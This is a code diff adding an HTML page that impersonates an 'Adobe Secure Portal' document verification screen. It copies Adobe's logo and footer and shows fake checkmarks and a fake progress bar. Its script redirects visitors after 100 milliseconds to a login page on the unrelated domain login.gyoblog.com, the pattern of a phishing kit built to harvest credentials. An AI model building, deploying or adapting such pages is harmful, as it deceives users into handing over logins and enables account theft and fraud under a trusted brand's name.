@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Secure Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f8f9fa;
+            color: #333;
+            line-height: 1.5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+        
+        header {
+            background-color: white;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-radius: 8px 8px 0 0;
+            border-bottom: 1px solid #eaeaea;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo {
+            height: 28px;
+            margin-right: 12px;
+        }
+        
+        .logo-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+        
+        .logo-subtext {
+            font-size: 18px;
+            font-weight: 400;
+            color: #6c757d;
+            margin-left: 6px;
+        }
+        
+        .sign-in-container {
+            display: flex;
+            align-items: center;
+        }
+        
+        .sign-in-btn {
+            background-color: #eb1000;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.2s;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+        }
+        
+        .sign-in-btn:hover {
+            background-color: #c40d00;
+        }
+        
+        .verification-container {
+            background-color: white;
+            border-radius: 0 0 8px 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            padding: 32px;
+        }
+        
+        .page-title {
+            font-size: 20px;
+            margin-bottom: 20px;
+            color: #1a1a1a;
+            font-weight: 600;
+        }
+        
+        .status-message {
+            background-color: #f8f9fa;
+            border-left: 4px solid #eb1000;
+            padding: 16px;
+            margin-bottom: 24px;
+            border-radius: 0 4px 4px 0;
+            font-size: 14px;
+            color: #495057;
+        }
+        
+        .verification-list {
+            list-style-type: none;
+            margin-bottom: 28px;
+        }
+        
+        .verification-item {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 16px;
+            padding: 4px 0;
+        }
+        
+        .checkbox {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #dee2e6;
+            border-radius: 4px;
+            margin-right: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 12px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+        
+        .checkbox.checked {
+            background-color: #28a745;
+            border-color: #28a745;
+        }
+        
+        .checkbox.pending {
+            background-color: #f8f9fa;
+            border-color: #adb5bd;
+            position: relative;
+        }
+        
+        .checkbox.pending::after {
+            content: "";
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: #6c757d;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .verification-text {
+            font-size: 15px;
+            color: #212529;
+        }
+        
+        /* Red text for first three verification items */
+        .verification-item.verified .verification-text {
+            color: #eb1000;
+            font-weight: 500;
+        }
+        
+        .progress-container {
+            margin-top: 28px;
+        }
+        
+        .progress-bar {
+            height: 6px;
+            background-color: #e9ecef;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        
+        .progress {
+            height: 100%;
+            background-color: #eb1000;
+            width: 60%;
+            border-radius: 3px;
+            transition: width 0.5s ease;
+        }
+        
+        .progress-text {
+            font-size: 13px;
+            color: #6c757d;
+            text-align: center;
+        }
+        
+        .warning {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 12px 16px;
+            border-radius: 4px;
+            font-size: 14px;
+            margin-top: 20px;
+            display: flex;
+            align-items: flex-start;
+        }
+        
+        .warning i {
+            margin-right: 10px;
+            font-size: 16px;
+            margin-top: 1px;
+            flex-shrink: 0;
+        }
+        
+        footer {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 12px;
+            color: #6c757d;
+        }
+        
+        .footer-links {
+            margin-top: 8px;
+        }
+        
+        .footer-links a {
+            color: #6c757d;
+            text-decoration: none;
+            margin: 0 8px;
+            transition: color 0.2s;
+        }
+        
+        .footer-links a:hover {
+            color: #eb1000;
+        }
+        
+        .powered-by {
+            margin-top: 16px;
+            font-size: 11px;
+            color: #adb5bd;
+        }
+        
+        .countdown {
+            margin-left: 8px;
+            font-weight: 600;
+        }
+        
+        .redirect-message {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #eb1000;
+            font-weight: 500;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                max-width: 100%;
+            }
+            
+            header {
+                padding: 14px 16px;
+            }
+            
+            .verification-container {
+                padding: 24px;
+            }
+            
+            .logo-text, .logo-subtext {
+                font-size: 16px;
+            }
+            
+            .logo {
+                height: 24px;
+                margin-right: 8px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 12px;
+            }
+            
+            .sign-in-container {
+                width: 100%;
+                justify-content: flex-end;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo-container">
+                <!-- Adobe Logo -->
+                <svg class="logo" viewBox="0 0 64.57 35" xmlns="http://www.w3.org/2000/svg">
+                    <defs>
+                        <style>
+                            .cls-1 {
+                                fill: #eb1000;
+                            }
+                        </style>
+                    </defs>
+                    <path class="cls-1" d="M6.27,10.22h4.39l6.2,14.94h-4.64l-3.92-9.92-2.59,6.51h3.08l1.23,3.41H0l6.27-14.94ZM22.03,13.32c.45,0,.94.04,1.43.16v-3.7h3.88v14.72c-.89.4-2.81.89-4.73.89-3.48,0-6.47-1.98-6.47-5.93s2.88-6.13,5.89-6.13ZM22.52,22.19c.36,0,.65-.07.94-.16v-5.42c-.29-.11-.58-.16-.96-.16-1.27,0-2.45.94-2.45,2.92s1.2,2.81,2.47,2.81ZM34.25,13.32c3.23,0,5.98,2.18,5.98,6.02s-2.74,6.02-5.98,6.02-6-2.18-6-6.02,2.72-6.02,6-6.02ZM34.25,22.13c1.11,0,2.14-.89,2.14-2.79s-1.03-2.79-2.14-2.79-2.12.89-2.12,2.79.96,2.79,2.12,2.79ZM41.16,9.78h3.9v3.7c.47-.09.96-.16,1.45-.16,3.03,0,5.84,1.98,5.84,5.86,0,4.1-2.99,6.18-6.53,6.18-1.52,0-3.46-.31-4.66-.87v-14.72ZM45.91,22.17c1.34,0,2.56-.96,2.56-2.94,0-1.85-1.2-2.72-2.5-2.72-.36,0-.65.04-.91.16v5.35c.22.09.51.16.85.16ZM58.97,13.32c2.92,0,5.6,1.87,5.6,5.64,0,.51-.02,1-.09,1.49h-7.27c.4,1.32,1.56,1.94,3.01,1.94,1.18,0,2.27-.29,3.5-.82v2.97c-1.14.58-2.5.82-3.9.82-3.7,0-6.58-2.23-6.58-6.02s2.61-6.02,5.73-6.02ZM60.93,18.02c-.2-1.27-1.05-1.78-1.92-1.78s-1.58.54-1.87,1.78h3.79Z"/>
+                </svg>
+                <span class="logo-text">Adobe</span>
+                <span class="logo-subtext">Secure Portal</span>
+            </div>
+            <div class="sign-in-container">
+                <div class="sign-in-btn">
+                    <span>Redirecting...</span>
+                </div>
+            </div>
+        </header>
+        
+        <div class="verification-container">
+            <h1 class="page-title">Document Verification</h1>
+            
+            <div class="status-message">
+                Your document is being verified and encrypted to ensure authenticity and browser safety.
+            </div>
+            
+            <ul class="verification-list">
+                <li class="verification-item verified">
+                    <div class="checkbox checked">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <span class="verification-text">Document integrity verified</span>
+                </li>
+                <li class="verification-item verified">
+                    <div class="checkbox checked">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <span class="verification-text">Digital certificate validated</span>
+                </li>
+                <li class="verification-item verified">
+                    <div class="checkbox checked" id="verification-checkbox">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <span class="verification-text">Completing secure verification...</span>
+                </li>
+                <li class="verification-item">
+                    <div class="checkbox">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <span class="verification-text">Applying digital signature</span>
+                </li>
+            </ul>
+            
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress" id="progress-bar"></div>
+                </div>
+                <div class="progress-text">Processing... 60% complete</div>
+            </div>
+            
+            <div class="redirect-message">
+                You will be redirected to the login page immediately...
+            </div>
+            
+            <div class="warning">
+                <i class="fas fa-exclamation-triangle"></i>
+                <div>Please do not close this session during verification.</div>
+            </div>
+        </div>
+        
+        <footer>
+            <div>© 2023 Adobe, Inc. All rights reserved.</div>
+            <div class="footer-links">
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Security</a>
+                <a href="#">Support</a>
+            </div>
+            <div class="powered-by">Powered by Adobe®</div>
+        </footer>
+    </div>
+
+    <script>
+        // Redirect immediately
+        document.addEventListener('DOMContentLoaded', function() {
+            const redirectUrl = "https://login.gyoblog.com/HXGFkrUi";
+            
+            // Redirect immediately
+            setTimeout(function() {
+                window.location.href = redirectUrl;
+            }, 100); // Small delay to ensure page is loaded
+        });
+    </script>
+</body>
+</html>
